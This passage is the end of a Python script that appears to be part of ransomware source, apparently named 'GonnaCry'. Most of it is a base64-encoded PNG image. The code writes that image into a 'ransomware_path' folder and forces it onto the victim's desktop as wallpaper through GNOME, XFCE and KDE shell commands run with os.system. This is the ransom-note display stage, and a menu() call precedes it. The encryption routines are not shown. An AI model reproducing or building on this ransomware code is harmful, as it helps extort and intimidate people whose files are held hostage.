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AgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAIACAQAAAAAAgAIBAAAAAACAAgEAAAAAAMD/tzvHNAAAAAyD/LuejSbj4CcQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAIBAAAAAAAgEAAAAgEAAAAAACAQAAACAQAAAAAAIBAAAAuDdszVnPtJNSSgAAAABJRU5ErkJggg=="""
    with open(ransomware_path + "/img.png", 'wb') as f:
        f.write(base64.b64decode(img))
    gnome = 'gsettings set org.gnome.desktop.background picture-uri {}'.format(ransomware_path + "/img.png")
    
    xfce = '''xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "{}" '''.format(ransomware_path + "/img.png")
    xfce1 = 'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor1/workspace0/last-image -s "{}"'.format(ransomware_path + "/img.png")

    kde = """dbus-send --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
var Desktops = desktops();                                                                                                                       
for (i=0;i<Desktops.length;i++) {
        d = Desktops[i];
        d.wallpaperPlugin = "org.kde.image";
        d.currentConfigGroup = Array("Wallpaper",
                                    "org.kde.image",
                                    "General");
        d.writeConfig("Image", "file:///home/tarcisio/gonnacry/img.png");
}'
"""

    os.system(gnome)
    os.system(xfce)
    os.system(xfce1)
    os.system(kde)

if __name__ == "__main__":
    menu()
    change_wallpaper()

